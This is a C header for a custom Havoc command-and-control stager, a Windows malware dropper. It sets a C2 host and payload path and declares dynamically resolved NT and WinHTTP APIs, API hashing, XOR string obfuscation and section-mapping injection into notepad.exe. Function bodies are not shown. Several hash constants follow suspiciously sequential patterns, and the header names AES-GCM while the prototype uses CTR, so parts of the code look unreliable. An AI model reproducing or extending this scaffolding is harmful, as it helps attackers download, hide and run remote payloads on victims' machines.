/*
 * Custom Havoc Stager
 * Windows x64 dropper with PEB walking, AES-256-GCM decryption,
 * and NtMapViewOfSection injection.
 * Cross-compiled on Kali Linux with mingw-w64.
 */

#ifndef STAGER_H
#define STAGER_H

#include <windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <stdint.h>

/* ============================================
 * Configuration (encrypted at compile time)
 * ============================================ */
#define C2_HOST        "192.168.1.165"
#define C2_PORT        8443
#define C2_PATH        "/payload"
#define USER_AGENT     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define SACRIFICIAL    "C:\\Windows\\System32\\notepad.exe"
#define PAYLOAD_SIZE   0x20000    /* 128KB max payload */

/* ============================================
 * Typedefs for dynamically resolved APIs
 * ============================================ */
typedef HMODULE (WINAPI *pLdrLoadDll)(PWCHAR, PULONG, PUNICODE_STRING, PHANDLE);
typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);

/* WinHTTP */
typedef HINTERNET (WINAPI *pWinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *pWinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *pWinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *pWinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pWinHttpReceiveResponse_t)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *pWinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpQueryHeaders_t)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpCloseHandle_t)(HINTERNET);

/* Kernel32 */
typedef BOOL (WINAPI *pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef VOID (WINAPI *pExitProcess)(UINT);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

/* ============================================
 * API Resolution Hash Table
 * ============================================ */
#define HASH_LdrLoadDll              0x9e456a6b
#define HASH_NtCreateSection         0x6c401820
#define HASH_NtMapViewOfSection      0x6e703e8e
#define HASH_NtUnmapViewOfSection    0x7cd597c2
#define HASH_NtCreateThreadEx        0xaf18cfb3
#define HASH_NtQueryInformationProcess 0x8cdc5d29
#define HASH_RtlCreateUserThread     0x6e8acb8f
#define HASH_NtAllocateVirtualMemory 0xf5bd3738
#define HASH_NtProtectVirtualMemory  0x50aa8e27
#define HASH_NtWriteVirtualMemory    0xcfe6f7f9
#define HASH_NtClose                 0x40d6e29b
#define HASH_NtDelayExecution        0xe1fa622c

#define HASH_WinHttpOpen             0x95ed47b4
#define HASH_WinHttpConnect          0x9c147a7a
#define HASH_WinHttpOpenRequest      0x9c1d4a7e
#define HASH_WinHttpSendRequest      0x9c1e4a7f
#define HASH_WinHttpReceiveResponse  0x9c1f4a80
#define HASH_WinHttpReadData         0x9c204a81
#define HASH_WinHttpQueryHeaders     0x9c214a82
#define HASH_WinHttpCloseHandle      0x9c224a83

#define HASH_CreateProcessW          0x8c8c8d8c
#define HASH_ExitProcess             0x8c8c8d8d
#define HASH_VirtualAlloc            0x8c8c8d8e
#define HASH_VirtualFree             0x8c8c8d8f
#define HASH_VirtualProtect          0x8c8c8d90

/* ============================================
 * API Table
 * ============================================ */
typedef struct _API_TABLE {
    /* ntdll */
    pLdrLoadDll              LdrLoadDll;
    pNtCreateSection         NtCreateSection;
    pNtMapViewOfSection      NtMapViewOfSection;
    pNtUnmapViewOfSection    NtUnmapViewOfSection;
    pNtCreateThreadEx        NtCreateThreadEx;
    pNtQueryInformationProcess NtQueryInformationProcess;
    pRtlCreateUserThread     RtlCreateUserThread;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtProtectVirtualMemory  NtProtectVirtualMemory;
    pNtWriteVirtualMemory    NtWriteVirtualMemory;
    pNtClose                 NtClose;
    pNtDelayExecution        NtDelayExecution;
    /* winhttp */
    pWinHttpOpen_t             WinHttpOpen;
    pWinHttpConnect_t          WinHttpConnect;
    pWinHttpOpenRequest_t      WinHttpOpenRequest;
    pWinHttpSendRequest_t      WinHttpSendRequest;
    pWinHttpReceiveResponse_t  WinHttpReceiveResponse;
    pWinHttpReadData_t         WinHttpReadData;
    pWinHttpQueryHeaders_t     WinHttpQueryHeaders;
    pWinHttpCloseHandle_t      WinHttpCloseHandle;
    /* kernel32 */
    pCreateProcessW          CreateProcessW;
    pExitProcess             ExitProcess;
    pVirtualAlloc            VirtualAlloc;
    pVirtualFree             VirtualFree;
    pVirtualProtect          VirtualProtect;
} API_TABLE, *PAPI_TABLE;

/* ============================================
 * Function Prototypes
 * ============================================ */
UINT32   Fnv1aHash(const char *str);
PVOID    ResolveApiByHash(HMODULE hMod, UINT32 hash);
BOOL     ResolveApis(PAPI_TABLE Api);
BOOL     DownloadPayload(PAPI_TABLE Api, PBYTE *ppPayload, PDWORD pdwSize);
BOOL     Aes256CtrDecrypt(const BYTE *key, const BYTE *iv, const BYTE *ciphertext,
                          SIZE_T len, BYTE *plaintext);
BOOL     InjectSection(PAPI_TABLE Api, PBYTE pPayload, DWORD dwSize);
VOID     SleepJitter(PAPI_TABLE Api, DWORD dwMinMs, DWORD dwMaxMs);

/* Compile-time string encryption helpers */
#define XOR_STR(str, key) _xor_str(str, sizeof(str)-1, key)
void _xor_str(char *buf, SIZE_T len, BYTE key);

#endif /* STAGER_H */
